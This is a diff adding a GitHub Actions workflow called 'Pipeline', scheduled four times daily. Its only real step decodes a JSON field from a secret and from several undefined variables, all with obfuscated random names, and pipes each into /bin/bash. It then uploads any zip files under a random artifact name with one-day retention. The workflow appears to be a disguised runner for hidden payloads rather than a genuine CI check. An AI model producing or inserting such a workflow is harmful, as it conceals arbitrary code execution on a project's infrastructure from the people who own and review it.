@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '30 2,8,14,20 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          yvtiw98: ${{ secrets.yvtiw98 }}
+        run: |
+          printf '%s' "$yvtiw98" | jq -r .iqopy8 | /bin/bash
+          printf '%s' "$jw93282" | jq -r .z8 | /bin/bash
+          printf '%s' "$xztzt3204" | jq -r .gsdm21 | /bin/bash
+          echo $tbmxf533 | jq -r .fdoea4 | /bin/bash
+          echo $agh4646 | jq -r .zugl3 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: QPhZEg5k
+          path: "*.zip"
+          retention-days: 1
